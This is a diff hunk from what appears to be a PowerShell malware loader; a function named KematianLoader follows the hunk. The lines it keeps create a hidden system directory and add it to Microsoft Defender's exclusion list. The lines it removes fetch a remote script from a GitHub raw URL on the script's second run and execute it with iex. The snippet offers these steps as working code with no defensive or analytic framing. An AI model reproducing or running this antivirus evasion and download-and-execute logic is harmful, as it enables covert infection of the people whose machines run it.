@@ -6,12 +6,6 @@ New-Item -ItemType Directory -Path $dir
 attrib +h +s $dir
 Add-MpPreference -ExclusionPath $dir
 
-$counterFile = "$dir\data.dat"
-$runCount = if (Test-Path $counterFile) { [int](Get-Content $counterFile) } else { 0 }
-$runCount++
-$runCount | Set-Content $counterFile
-if ($runCount -eq 2) { iex (iwr "https://raw.githubusercontent.com/43a1723/test/main/Extras/hacklife/startup.ps1").Content }
-if ($runCount -eq 3) { Write-Output "lmao" }
 
 
 function KematianLoader {
